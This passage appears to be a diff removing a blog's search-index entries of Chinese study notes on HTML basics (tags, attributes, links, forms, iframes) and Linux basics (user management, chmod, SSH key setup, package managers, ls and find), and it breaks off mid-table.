-空格的使用对于 HTML，无法通过在 HTML 代码中添加额外的空格或换行来改变输出的效果。
-当显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。需要注意的是，HTML 代码中的所有连续的空行（换行）也被显示为一个空格。
-&lt;p&gt;    春眠不觉晓，      处处闻啼鸟。        夜来风雨声，          花落知多少。&lt;/p&gt;&lt;p&gt;注意，浏览器忽略了源代码中的排版（省略了多余的空格和换行）。&lt;/p&gt;
-
-
-
-HTML文本格式化标签文本加粗&lt;b&gt;这个文本是加粗的&lt;/b&gt;
-
-&lt;strong&gt;这个文本是加粗的&lt;/strong&gt;
-
-
-
-文字放大与缩小&lt;big&gt;这个文本字体放大&lt;/big&gt;
-
-&lt;small&gt;这个文本是缩小的&lt;/small&gt;
-
-
-
-文字斜体&lt;em&gt;这个文本是斜体的&lt;/em&gt;
-
-&lt;i&gt;这个文本是斜体的&lt;/i&gt;
-
-
-
-上下标这个文本包含&lt;sub&gt;下标&lt;/sub&gt;
-
-这个文本包含&lt;sup&gt;上标&lt;/sup&gt;
-
-
-
-定义预格式文本&lt;pre&gt;此例演示如何使用 pre 标签对空行和    空格进行控制&lt;/pre&gt;
-
-
-注：HTML未对此处的空格和换行进行处理为一个空格
-定义缩写&lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;&lt;br /&gt;&lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;&lt;p&gt;在某些浏览器中，当您把鼠标移至缩略词语上时，title 可用于展示表达的完整版本。&lt;/p&gt;&lt;p&gt;仅对于 IE 5 中的 acronym 元素有效。&lt;/p&gt;&lt;p&gt;对于 Netscape 6.2 中的 abbr 和 acronym 元素都有效。&lt;/p&gt;
-
-
-
-文字方向&lt;p&gt;该段落文字从左到右显示。&lt;/p&gt;  &lt;p&gt;&lt;bdo dir=&quot;rtl&quot;&gt;该段落文字从右到左显示。&lt;/bdo&gt;&lt;/p&gt;  
-
-
-
-引用短引用&lt;q&gt;Build a future where people live in harmony with nature.&lt;/q&gt;
-
-
-
-长引用&lt;blockquote cite=&quot;http://www.worldwildlife.org/who/index.html&quot;&gt;For 50 years, WWF has been protecting the future of nature. The worlds leading conservation organization, WWF works in 100 countries and is supported by 1.2 million members in the United States and close to 5 million globally.&lt;/blockquote&gt;
-
-
-
-
-下划线(插入线)与删除线&lt;p&gt;My favorite color is &lt;del&gt;blue&lt;/del&gt; &lt;ins&gt;red&lt;/ins&gt;!&lt;/p&gt;
-
-
-
-标签所对应的全拼&lt;b&gt;---bold&lt;em&gt;---emphasize&lt;i&gt;---italic&lt;sub&gt;---subscript&lt;sup&gt;---superscript&lt;ins&gt;---insert&lt;del&gt;---delete&lt;kbd&gt;---keyboard&lt;bdo&gt;---Bi-Directional Override&lt;q&gt;---quote&lt;dfn&gt;---define
-
-
-
-HTML元素开始标签常被称为起始标签（opening tag），结束标签常称为闭合标签（closing tag)
-语法
-HTML 元素以开始标签起始
-HTML 元素以结束标签终止
-元素的内容是开始标签与结束标签之间的内容
-某些 HTML 元素具有空内容（empty content）
-空元素在开始标签中进行关闭（以开始标签的结束而结束）
-大多数 HTML 元素可拥有属性
-
-HTML 元素的嵌套大多数 HTML 元素可以嵌套（HTML 元素可以包含其他 HTML 元素）。
-无结束标签即使忘记了使用结束标签，大多数浏览器也会正确地显示 HTML。忘记使用结束标签会产生不可预料的结果或错误。
-HTML属性属性是 HTML 元素提供的附加信息。
-实例
-&lt;a href=&quot;https://heyhjwei.github.io/&quot;&gt;这是一个链接使用了 href 属性&lt;/a&gt;
-
-HTML 链接由 &lt;a&gt; 标签定义。链接的地址在 href 属性中指定
-引用属性值的方法
-
-属性值应该始终被包括在引号内。
-双引号是最常用的，不过使用单引号也没有问题。
-在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号
-
-例如：
-name=&#x27;John &quot;ShotGun&quot; Nelson&#x27;
-
-注意：
-
-属性和属性值，尽量小写，本来这样做也方便些。
-class 属性可以多用 class=&quot; &quot; （引号里面可以填入多个class属性）
-id 属性只能单独设置 **id=&quot; &quot;**（只能填写一个，多个无效）
-
-大多数 HTML 元素的属性：
-
-
-
-属性
-目的和用途
-可使用的元素
-
-
-
-class
-可以用于选择和样式化元素。可以在 CSS 中使用类选择器来选择具有特定类名的元素，并应用样式规则。
-适用于大多数 HTML 元素，如&lt;div&gt;, &lt;p&gt;, &lt;span&gt;, &lt;h1&gt;, 等等
-
-
-id
-用于为元素指定唯一的标识符。可以使用 JavaScript 或 CSS 来选择具有特定 id 的元素，并对其进行操作或样式化。
-适用于大多数 HTML 元素，如&lt;div&gt;, &lt;p&gt;, &lt;span&gt;, &lt;h1&gt;, 等等
-
-
-style
-内联样式
-适用于大多数 HTML 元素，如&lt;div&gt;, &lt;p&gt;, &lt;span&gt;, &lt;h1&gt;, 等等
-
-
-src
-指定外部资源的 URL
-&lt;img&gt;, &lt;script&gt;, &lt;iframe&gt;, &lt;video&gt;, &lt;audio&gt;, 等等
-
-
-href
-用于创建超链接,指定链接的 URL
-&lt;a&gt;, &lt;link&gt;, &lt;area&gt;, 等等
-
-
-alt
-为图像元素提供替代文本。当图像无法加载或无法显示时，浏览器会显示 alt 属性中的文本。
-&lt;img&gt;
-
-
-width
-元素的宽度
-&lt;img&gt;, &lt;canvas&gt;, &lt;video&gt;, &lt;audio&gt;, &lt;table&gt;, 等等
-
-
-height
-元素的高度
-&lt;img&gt;, &lt;canvas&gt;, &lt;video&gt;, &lt;audio&gt;, &lt;table&gt;, 等等
-
-
-disabled
-禁用元素，例如，可以将按钮元素 (&lt;button&gt;) 的 disabled 属性设置为 true，以禁用按钮，防止用户点击它。
-&lt;button&gt;, &lt;input&gt;, &lt;select&gt;, &lt;textarea&gt;, 等等
-
-
-readonly
-将元素设置为只读
-&lt;input&gt;, &lt;textarea&gt;, 等等
-
-
-placeholder
-输入字段的占位符文本
-&lt;input&gt;, &lt;textarea&gt;, 等等
-
-
-required
-设置元素为必填
-&lt;input&gt;, &lt;select&gt;, &lt;textarea&gt;, 等等
-
-
-value
-元素的值
-&lt;input&gt;, &lt;button&gt;, &lt;option&gt;, &lt;textarea&gt;, 等等
-
-
-checked
-设置复选框或单选按钮的选中状态
-&lt;input type=&quot;checkbox&quot;&gt;, &lt;input type=&quot;radio&quot;&gt;, 等等
-
-
-maxlength
-输入字段的最大字符数
-&lt;input&gt;, &lt;textarea&gt;, 等等
-
-
-min, max
-输入字段的最小值和最大值
-&lt;input type=&quot;number&quot;&gt;, &lt;input type=&quot;date&quot;&gt;, &lt;input type=&quot;time&quot;&gt;, 等等
-
-
-placeholder
-为输入字段提供占位符文本，用于提示用户输入的内容。例如，您可以在文本输入字段 (&lt;input type=&quot;text&quot;&gt;) 中使用 placeholder 属性来提供示例输入。
-&lt;input type=&quot;text&quot;&gt;
-
-
-HTML 头部&lt;head&gt; 元素包含了所有的头部标签元素。在 &lt;head&gt;元素中你可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。
-可以添加在头部区域的元素标签为: &lt;title&gt;, &lt;style&gt;, &lt;meta&gt;, &lt;link&gt;, &lt;script&gt;, &lt;noscript&gt; 和 &lt;base&gt;。
-&lt;title&gt; 元素&lt;title&gt; 标签定义了不同文档的标题。&lt;title&gt; 在 HTML&#x2F;XHTML 文档中是必需的。
-
-定义了浏览器工具栏的标题
-当网页添加到收藏夹时，显示在收藏夹中的标题
-显示在搜索引擎结果页面的标题
-
-HTML&lt;title&gt;元素不仅可以显示文本，也可以在左侧显示logo等图片。显示时，要将&lt;link&gt;标签放入&lt;head&gt;里。
-&lt;base&gt; 元素&lt;base&gt; 标签描述了基本的链接地址&#x2F;链接目标，该标签作为HTML文档中所有的链接标签的默认链接:
-&lt;head&gt; &lt;base href=&quot;http://www.runoob.com/images/&quot; target=&quot;_blank&quot;&gt; &lt;/head&gt;
-
-
-
-&lt;link&gt; 元素&lt;link&gt; 标签定义了文档与外部资源之间的关系。
-&lt;link&gt; 标签通常用于链接到样式表:
-&lt;head&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt; &lt;/head&gt;
-
-
-
-&lt;style&gt; 元素&lt;style&gt; 标签定义了HTML文档的样式文件引用地址.
-
-在&lt;style&gt; 元素中你也可以直接添加样式来渲染 HTML 文档:
-&lt;head&gt; &lt;style type=&quot;text/css&quot;&gt; body &#123;    background-color:yellow; &#125; p &#123;    color:blue &#125; &lt;/style&gt; &lt;/head&gt;
-
-
-
-&lt;meta&gt; 元素meta标签描述了一些基本的元数据。元数据也不显示在页面上，但会被浏览器解析。元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。
-&lt;meta&gt; 一般放置于 &lt;head&gt; 区域
- 使用实例
-为搜索引擎定义关键词:
-&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;
-
-为网页定义描述内容:
-&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;
-
-定义网页作者:
-&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;
-
-每30秒钟刷新当前页面:
-&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;
-
-
-
-HTML &lt;script&gt; 元素&lt;script&gt;标签用于加载脚本文件，如： JavaScript。
-链接HTML 链接是通过标签 &lt;a&gt; 来定义的。
-超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。
-语法以下是 HTML 中创建链接的基本语法和属性：code&gt;&lt;a&gt; 元素：创建链接的主要HTML元素是&lt;a&gt;（锚）元素。&lt;a&gt;元素具有以下属性：
-
-href：指定链接目标的URL，这是链接的最重要属性。可以是另一个网页的URL、文件的URL或其他资源的URL。
-target（可选）：指定链接如何在浏览器中打开。常见的值包括 _blank（在新标签或窗口中打开链接）和 _self（在当前标签或窗口中打开链接）。
-title（可选）：提供链接的额外信息，通常在鼠标悬停在链接上时显示为工具提示。
-rel（可选）：指定与链接目标的关系，如 nofollow、noopener 等。
-
-使用实例文本链接：最常见的链接类型是文本链接，它使用 &lt;a&gt; 元素将一段文本转化为可点击的链接，例如：
-&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt;
-
-图像链接：您还可以使用图像作为链接。在这种情况下，&lt;a&gt; 元素包围着 &lt;img&gt; 元素。例如：
-&lt;a href=&quot;https://www.example.com&quot;&gt;  &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;&lt;/a&gt;
-
-锚点链接：除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 &lt;a&gt; 元素定义一个标记，并使用#符号引用该标记。例如：
-&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;&lt;!-- 在页面中的某个位置 --&gt;&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;
-
-下载链接：如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：
-&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;
-
-跳转id链接 
-id 属性可用于创建一个 HTML 文档书签。
-提示: 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。
-在HTML文档中创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：
-&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;
-
-或者，从另一个页面创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：
-&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;
-
-邮箱链接
-&lt;--案例1 --&gt;&lt;/--&gt;&lt;a href=&quot;mailto:someone@example.com?Subject=Hello%20again&quot; target=&quot;_top&quot;&gt; &lt;--案例2 --&gt;&lt;/--&gt;&lt;a href=&quot;mailto:someone@example.com?cc=someoneelse@example.com&amp;bcc=andsomeoneelse@example.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!&quot; target=&quot;_top&quot;&gt;发送邮件!&lt;/a&gt;
-
-案例2可设置指定的收件内容以及内容
-图像HTML 图像是通过标签 &lt;img&gt; 来定义的.&lt;img&gt; 是空标签，意思是说，它只包含属性，并且没有闭合标签。
-语法&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;
-
-Alt属性alt 属性用来为图像定义一串预备的可替换的文本。
-替换文本属性的值是用户定义的。
-&lt;img src=&quot;boat.gif&quot; alt=&quot;Big Boat&quot;&gt;
-
-在浏览器无法载入图像时，此时，浏览器将显示这个替代性的文本而不是图像。
-设置图像的高度与宽度height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。
-属性值默认单位为像素:
-&lt;img src=&quot;pulpit.jpg&quot; alt=&quot;Pulpit rock&quot; width=&quot;304&quot; height=&quot;228&quot;&gt;
-
-实例：
-&lt;img src=&quot;https://hijwei.top/images/redefine-avatar.jpg&quot; alt=&quot;cola&quot; width=&quot;39&quot; height=&quot;39&quot; /&gt;
-
-实现效果
-
-
-
-
-表格HTML 表格由 &lt;table&gt; 标签来定义。HTML 表格是一种用于展示结构化数据的标记语言元素。
-&lt;table&gt; 元素表示整个表格，它包含两个主要部分：&lt;thead&gt; 和 &lt;tbody&gt;。
-
-&lt;thead &gt; 用于定义表格的标题部分: 在 &lt;thead &gt; 中，使用 &lt;th &gt; 元素定义列的标题，以上实例中列标题分别为”列标题1”，”列标题2”和”列标题3”。
-&lt;tbody &gt; 用于定义表格的主体部分: 在 &lt;tbody &gt; 中，使用 &lt;tr &gt; 元素定义行，并在每行中使用 &lt;td &gt; 元素定义单元格数据，以上实例中有两行数据，每行包含三个单元格。
-
-每个表格均有若干行（由 &lt;tr&gt; 标签定义），每行被分割为若干单元格（由 &lt;td&gt; 标签定义），表格可以包含标题行（**&lt;th&gt;**）用于定义列的标题。
-
-tr：tr 是 table row 的缩写，表示表格的一行。
-td：td 是 table data 的缩写，表示表格的数据单元格。
-th：th 是 table header的缩写，表示表格的表头单元格。
-
-数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。
-表格和边框属性如果不定义边框属性，表格将不显示边框。有时这很有用，但是大多数时候，我们希望显示边框。使用边框属性来显示一个带有边框的表格table后面加入border=&quot;1&quot;
-列表列表项内部可以使用段落、换行符、图片、链接以及其他列表等等。
-无序列表无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。
-无序列表使用 &lt;ul&gt; 标签
-有序列表同样，有序列表也是一列项目，列表项目使用数字进行标记。 有序列表始于 &lt;ol&gt; 标签。每个列表项始于 &lt;li&gt; 标签。
-列表项使用数字来标记。
-自定义列表自定义列表不仅仅是一列项目，而是项目及其注释的组合。自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt; 开始。
-HTML 区块区块元素和内联元素HTML 区块元素大多数 HTML 元素被定义为块级元素或内联元素。
-块级元素在浏览器显示时，通常会以新行来开始（和结束）。
-实例: &lt;div&gt;、&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;
-HTML 内联元素内联元素在显示时通常不会以新行开始。
-实例: &lt;span&gt;,&lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;
-&lt;div&gt;与 &lt;span&gt;
-&lt;div&gt; 是块级元素，它独占一行，可以设置宽度、高度以及边距等样式属性。它适合用于创建页面的大块结构，例如页面的主体区域、容器、布局等。
-&lt;span&gt; 是行内元素，它不会独占一行，宽度默认由其内容决定。它适合用于对文本或其他行内元素进行样式化、标记或包裹。
-嵌套关系：
-
-&lt;div&gt; 可以容纳其他块级元素和行内元素，包括其他的 &lt;div&gt; 和 &lt;span&gt; 元素。
-&lt;span&gt;通常被用来包裹文本或其他行内元素，比如用来设置特定文本的样式。
-
-表单和输入HTML 表单用于收集用户的输入信息。
-表单元素是允许用户在表单中输入内容，比如：文本域（textarea）、下拉列表（select）、单选框（radio-buttons）、复选框（checkbox） 等等。
-我们可以使用 &lt;form&gt; 标签来创建表单:
-HTML 表单 - 输入元素多数情况下被用到的表单标签是输入标签 **&lt;input&gt;**。输入类型是由type属性定义。接下来我们介绍几种常用的输入类型。
-文本域文本域通过 &lt;input type=&quot;text&quot;&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。
-&lt;form&gt;First name: &lt;input type=&quot;text&quot; name=&quot;firstname&quot;&gt;&lt;br&gt;Last name: &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;&lt;/form&gt;
-
-注意:表单本身并不可见。同时，在大多数浏览器中，文本域的默认宽度是 20 个字符。
-密码字段密码字段通过标签 &lt;input type=&quot;password&quot;&gt; 来定义:
-&lt;form&gt;Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/form&gt;
-
-注意：密码字段字符不会明文显示，而是以星号 ***** 或圆点 . 替代。
-单选按钮&lt;input type=&quot;radio&quot;&gt; 标签定义了表单的单选框选项:
-&lt;form action=&quot;&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;男&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;&gt;女&lt;/form&gt;
-
-复选框&lt;input type=&quot;checkbox&quot;&gt; 定义了复选框。
-复选框可以选取一个或多个选项：
-&lt;form&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;&gt;我喜欢自行车&lt;br&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;&gt;我喜欢小汽车&lt;/form&gt;
-
-提交按钮&lt;input type=&quot;submit&quot;&gt; 定义了提交按钮。
-当用户单击确认按钮时，表单的内容会被传送到服务器。表单的动作属性 action 定义了服务端的文件名。action 属性会对接收到的用户输入数据进行相关的处理:
-&lt;form name=&quot;input&quot; action=&quot;html_form_action.php&quot; method=&quot;get&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;
-
-
-
-框架iframe语法:
-&lt;iframe src=&quot;URL&quot;&gt;&lt;/iframe&gt;
-
-该URL指向不同的网页。
-iframe - 设置高度与宽度height 和 width 属性用来定义iframe标签的高度与宽度。
-属性默认以像素为单位, 但是你可以指定其按比例显示 (如：”80%”)。
-&lt;iframe src=&quot;demo_iframe.htm&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;
-
-iframe - 移除边框frameborder 属性用于定义iframe表示是否显示边框。
-设置属性值为 “0” 移除iframe的边框:
-&lt;iframe src=&quot;demo_iframe.htm&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;
-
-使用 iframe 来显示目标链接页面iframe 可以显示一个目标链接的页面
-目标链接的属性必须使用 iframe 的属性，如下实例:
-&lt;iframe src=&quot;demo_iframe.htm&quot; name=&quot;iframe_a&quot;&gt;&lt;/iframe&gt; &lt;p&gt;&lt;a href=&quot;https://1.top&quot; target=&quot;iframe_a&quot; rel=&quot;noopener&quot;&gt;HIJWEI.TOP&lt;/a&gt;&lt;/p&gt;
-
-
-
-文章引用1.引用菜鸟教程的文章    原文链接：https://www.runoob.com/html/html-tutorial.html
-]]></content>
-      <categories>
-        <category>开发</category>
-      </categories>
-      <tags>
-        <tag>开发</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux笔记</title>
-    <url>/posts/1406167115/</url>
-    <content><![CDATA[用户管理创建指令通常是useradd或adduser
-
-使用useradd命令：sudo useradd 选项 用户名
-
-
-选项:
--c comment 指定一段注释性描述。
--d 目录 指定用户主目录（如果已存在）。如果此目录不存在，则同时使用-m选项，可以创建主目录。如：sudo useradd –d  /home/sam -m sam
--g 用户组 指定用户所属的用户组。
--G 用户组，用户组 指定用户所属的附加组。
--s Shell文件 指定用户的登录Shell。
--u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。
-
-
-
-
-使用adduser命令：sudo adduser 用户名
-
-创建用户后，系统会自动为该用户分配一个默认的主目录和用户组。
-设置密码passwd命令：
-sudo passwd 选项 用户名
-
-选项：
-
--l 锁定口令，即禁用账号。
--u 口令解锁。
--d 使账号无口令。
--f 强迫用户下次登录时修改口令。
-
-修改帐号usermod命令，其格式如下：
-usermod 选项 用户名
-
-常用的选项包括-c, -d, -m, -g, -G, -s, -u以及-o等，这些选项的意义与useradd命令中的选项一样，可以为用户指定新的资源值。
-另外，有些系统可以使用选项：-l 新用户名
-这个选项指定一个新的账号，即将原来的用户名改为新的用户名。
-删除帐号userdel命令，其格式如下：
-userdel 选项 用户名
-
-常用的选项是 -r，它的作用是把用户的主目录一起删除。
-用户组管理增加用户组groupadd命令：
-groupadd 选项 用户组
-
-选项：
-
--g GID 指定新用户组的组标识号（GID）。
--o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。
-
-删除用户组groupdel命令
-groupdel 用户组
-
-修改用户组groupmod命令
-groupmod 选项 用户组
-
-选项：
-
--g GID 为用户组指定新的组标识号。
--o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。
--n新用户组 将用户组的名字改为新名字
-
-用户在用户组之间切换newgrp命令
-newgrp root
-
-（前提条件是root用户组确实是该用户的主组或附加组）这条命令将当前用户切换到root用户组，
-权限控制授予用户sudo权限用户到sudo用户组：
-
-在某些Linux发行版中，可以将用户添加到sudo用户组来赋予其sudo权限。
-
-使用以下命令将用户添加到sudo用户组：
-sudo usermod -aG sudo 用户名
-
-文件权限文件权限位包括读取（read）、写入（write）和执行（execute）权限。
-
-读取权限（r）允许用户查看文件内容和属性。
-写入权限（w）允许用户修改文件内容和属性。
-执行权限（x）允许用户以可执行文件的形式运行文件（例如，脚本或可执行程序）或进入目录。
-
-每个文件都有三组权限位，分别对应文件的所有者、用户组和其他用户。
-更改文件权限 chmod 命令可以更改文件的权限
-数字模式：可以使用三个八进制数字（0-7）来表示权限位。每个数字代表一个权限组，分别表示所有者、用户组和其他用户的权限。
-
-每个权限位用一个数字表示，对应的值为：
-r：4             w：2               x：1                   -：0
-
-
-将三个权限位的数字相加，得到一个三位数，例如：
-rwx：4 + 2 + 1 &#x3D; 7
-rw-：4 + 2 + 0 &#x3D; 6
-r–：4 + 0 + 0 &#x3D; 4
-—：0 + 0 + 0 &#x3D; 0
-
-
-
-符号模式：可以使用 +、- 和 = 符号来添加、移除或设置权限。符号前表示用户u（所有者）、g（用户组）、o（其他用户）、a（所有用户），后表示所操作的权限。
-
-给予读取权限：
-给予所有者读取权限：chmod u+r 文件名
-给予用户组读取权限：chmod g+r 文件名
-给予其他用户读取权限：chmod o+r 文件名
-给予所有用户（包括所有者、用户组和其他用户）读取权限：chmod a+r 文件名
-
-
-给予写入权限：
-给予所有者写入权限：chmod u+w 文件名
-给予用户组写入权限：chmod g+w 文件名
-给予其他用户写入权限：chmod o+w 文件名
-给予所有用户写入权限：chmod a+w 文件名
-
-
-给予执行权限：
-给予所有者执行权限：chmod u+x 文件名
-给予用户组执行权限：chmod g+x 文件名
-给予其他用户执行权限：chmod o+x 文件名
-给予所有用户执行权限：chmod a+x 文件名
-
-
-
-远程登录Linux 系统中是通过 ssh 服务实现的远程登录功能，默认 ssh 服务端口号为 22
-第一种级别（基于口令的安全验证）：只要你知道自己帐号和口令，就可以登录到远程主机。
-第二种级别（基于密钥的安全验证）：你必须为自己创建一对密钥，并把公钥放在需要访问的服务器上。
-密钥连接1.生成ssh key的文件windows 用户可以使用 WSL，或使用 Git Bash进行执行命令
-ssh-keygen 命令
-ssh-keygen 参数
-
-可选参数：
-
--t：指定密钥类型。常见的选项包括 rsa、dsa、ecdsa 和 ed25519。默认为 rsa。
--b：指定密钥位数。默认为 2048 位。常见的选项包括 1024、2048、4096。
--C：添加注释。可以在生成的公钥文件中添加一段注释，用于标识该密钥的用途或所有者等信息。
--f：指定生成的密钥文件名。可以自定义密钥文件的名称和路径。
--N：设置密码短语（passphrase）。可以为私钥文件设置密码短语，以增加安全性。
--q：静默模式。生成密钥时不显示进度或警告信息。
--y：从私钥文件中提取公钥。可以使用私钥文件生成对应的公钥文件。
-
-XiaoWei@XiaoWEI MINGW64 ~/.ssh$ ssh-keygen -t rsa -b 4096 -f aliyun_rsaGenerating public/private rsa key pair.Enter passphrase (empty for no passphrase):  //如果不想在之后登录的时候还需要输入密码请直接回车Enter same passphrase again:   //如果不想在之后登录的时候还需要输入密码请直接回车Your identification has been saved in aliyun_rsaYour public key has been saved in aliyun_rsa.pub
-
-注意：
-密钥用于鉴权，请谨慎保管。公钥文件以 .pub 扩展名结尾，可以公开给其他人，而没有 .pub 扩展名的私钥文件不要泄露给任何人！
-2.部署公钥到服务器
-创建 SSH 目录和授权文件：在目标服务器上，如果尚未存在，请创建 .ssh 目录，并将其权限设置为 700：
-mkdir -p ~/.sshchmod 700 ~/.ssh
-
-添加公钥到授权文件：将公钥粘贴到服务器上的 ~/.ssh/authorized_keys 文件中。如果该文件不存在，请创建它，并将其权限设置为 600：
-vim ~/.ssh/authorized_keyschmod 600 ~/.ssh/authorized_keys
-
-保存并退出：保存对 authorized_keys 文件的更改，并退出服务器。
-
-
-3.更改配置文件有些Linux可能默认禁止ssl的密钥登录
-
-SSH 配置文件位于 /etc/ssh/sshd_config，可使用以下命令进行配置
-sudo vi /etc/ssh/sshd_config
-
-如果您只想更改用户级别的 SSH 配置，可以编辑 ~/.ssh/config 文件。
-
-在配置文件中，常见的 SSH 配置选项：
-
-Port：指定 SSH 服务器监听的端口号。
-PermitRootLogin：允许或禁止使用 root 用户进行 SSH 登录。
-PasswordAuthentication：允许或禁止使用密码进行身份验证。
-PubkeyAuthentication：允许或禁止使用公钥进行身份验证。
-AllowUsers 或 AllowGroups：限制允许登录的用户或组。
-DenyUsers 或 DenyGroups：禁止登录的用户或组。
-PrintMotd：显示登录时的欢迎信息。
-Banner：指定自定义的登录横幅文件。
-
-
-
-4.本机ssh的config设置（快捷登录）Host 名称(自己决定，方便输入记忆的)    HostName 主机名 #172.16.8.152    User root # SSH 连接的用户名    # Port 29172 端口 默认22    # PreferredAuthentications publickey,password  # 选项publickey/password/publickey,password  设置首选的身份验证方法，先尝试公钥验证，然后尝试密码验证    # IdentityFile ~/.ssh/work_id_rsa  # 使用的身份验证密钥文件路径    # ForwardAgent yes  # 启用 SSH 代理转发    # ForwardX11 yes  # 启用 X11 转发    # Compression yes  # 启用连接压缩    # StrictHostKeyChecking yes  # 设置主机密钥检查级别为严格检查    # LogLevel VERBOSE  # 设置 SSH 客户端的日志级别为详细模式    # ServerAliveInterval 60  # 设置 SSH 连接的保活机制，每60秒发送保活消息    # ServerAliveCountMax 3  # 设置 SSH 连接的保活机制，最多发送3个保活消息    # ProxyJump jumpbox  # 使用跳板机（代理主机）访问目标主机
-
-
-
-软件安装
-Ubuntu&#x2F;Debian:
-使用APT包管理器：
-安装软件：sudo apt-get install 软件名称
-卸载软件：sudo apt-get remove 软件名称
-更新软件包列表：sudo apt-get update
-升级已安装的软件包：sudo apt-get upgrade
-
-
-
-
-CentOS&#x2F;RHEL&#x2F;Fedora:
-使用YUM包管理器：
-安装软件：sudo yum install 软件名称
-卸载软件：sudo yum remove 软件名称
-更新软件包列表：sudo yum update
-升级已安装的软件包：sudo yum upgrade
-
-
-
-
-Alpine Linux:
-使用apk包管理器：
-
-安装软件：apk add 软件名称
-
-卸载软件：apk del 软件名称
-
-更新软件包列表：apk update
-
-升级已安装的软件包：apk upgrade
-
-
-
-
-
-
-常用命令前置知识1.目录符号 / 表示从 根目录
-~表示从 家目录(即&#x2F;home&#x2F;用户名，root用户为/root)
-. 代表当前目录
-.. 代表上一级目录
-2.绝对目录与相对目录相对路径 在输入路径时，使用.或者..，表示相对 当前目录 所在的目录位置 
-绝对路径 在输入路径时，最前面是 &#x2F; 或者 ~，表示从 根目录&#x2F;家目录 开始的具体目录位置，特点：需要写入完整地址
-3.&gt; 和 &gt;&gt;重定向 命令功能：将命令执行结果重定向到一个文件，将本应显示在终端上的内容 输出或追加 到指定文件中
- &gt; 表示输出，会覆盖文件原有的内容 
-&gt;&gt; 表示追加，会将内容追加到已有文件的末尾
-4.|管道符
-Linux 允许将 一个命令的输出 可以通过管道| 做为 另一个命令的输入
-这里 | 的左右分为两端， 左端塞东西（写），右端取东西（读）
-
-pwd 命令对应单词：print working directory
-功能：打印当前工作目录
-ls 命令对应单词：list
-功能：列出目录的内容或者使用通配符列出文件名匹配的文件
-格式:
-ls [参数]
-
-可选参数
-
-
-
--a
-显示指定目录下所有目录与文件，包括隐藏文件
-
-
-
--l
-以列表方式显示文件的详细信息
-
-
--h
-配合 -l 以人性化的方式显示文件大小
-
-
-注意：以 . 开头的文件为隐藏文件，需要用 -a 参数才能显示
-find 命令对应单词：find
-功能：指定目录及其子目录下查找文件和目录
-格式
-find [路径] [匹配条件] [动作]
-
-常用的匹配条件：
-
-
-
-可选匹配条件
-作用
-
-
-
--name
-按文件名查找，支持使用通配符 * 和 ?
-
-
--type
-按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。
-
-
--size[+-]
-按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。
-
-
--mtime
-按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。
-
-
--user
-按文件所有者查找。
-
-
--group
